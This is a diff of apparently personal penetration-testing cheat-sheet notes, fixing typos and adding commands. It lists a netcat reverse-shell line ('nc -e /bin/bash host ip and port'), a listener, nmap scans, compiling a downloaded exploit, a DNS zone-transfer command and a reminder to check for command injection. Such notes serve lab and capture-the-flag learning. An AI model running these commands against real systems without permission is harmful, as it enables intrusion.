@@ -3,7 +3,7 @@ For us to easily remember the things we forgot
 netcad 
 nc -nvlp port for listening ports wich is we wanna use that
 next type id next ls or pwd
-nc -e /bin/bash host and port when we enter system 
+nc -e /bin/bash host ip and port when we enter system 
 nmap:
 nmap -sS -A -v -p --min-rate 99999 host 
 nmap -p- -sV port scanning ant its version
@@ -30,7 +30,7 @@ gcc -o exploit 44298.c
 and ls 
 
 
-python -m SimpleHHTPServer 80
+python -m SimpleHTTPServer 80
 
 chmod +x exploit for giving a permission(x using execute)
 
@@ -49,10 +49,13 @@ next time ls -la shows to us permission
 
 
 dnszone using:
-dif -t NS(name server)
+dig -t NS(name server)
+dig axfr @nameserver nameserver
 
-nslookup for finfing domain
+nslookup for finding nameserver
+
+check the command injection
 
  
  
- 
+ ctrl u (for inspect source)
